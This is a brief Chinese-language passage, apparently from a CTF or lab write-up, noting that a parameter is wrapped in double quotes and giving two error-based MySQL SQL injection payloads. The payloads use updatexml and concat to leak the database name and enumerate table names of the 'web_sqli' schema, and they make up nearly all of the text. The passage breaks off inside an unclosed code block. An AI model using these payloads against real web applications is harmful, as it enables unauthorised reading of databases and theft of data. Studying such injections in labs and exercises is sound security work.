可见是双引号包裹，报错注入

```
2"||(updatexml(1,concat(0x7e,database(),0x7e),1))#
2"||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli')),0x7e),1))#

